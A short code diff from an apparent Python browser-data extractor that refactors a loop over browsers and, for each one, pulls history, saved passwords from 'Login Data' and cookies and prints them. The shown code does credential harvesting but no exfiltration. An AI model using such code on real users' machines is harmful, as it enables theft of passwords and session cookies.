@@ -21,12 +21,13 @@ class Main:
 
             profiles = ["Default"]
 
-        for browser in extractor.browsers:
+        for browserKey in extractor.browsers:
+            browserValue = extractor.browsers[browserKey]
 
-            browserExtractor = extractor.Extract(browser+"\\Local State")
-            history = browserExtractor.extractHistory(browser+"\\History")
-            passwd = browserExtractor.extractPasswd(browser+"\\Login Data")
-            cookies = browserExtractor.extractCookies(browser)
+            browserExtractor = extractor.Extract(browserValue+"\\Local State")
+            history = browserExtractor.extractHistory(browserValue+"\\History")
+            passwd = browserExtractor.extractPasswd(browserValue+"\\Login Data")
+            cookies = browserExtractor.extractCookies(browserValue)
 
             print(history)
             print(passwd)
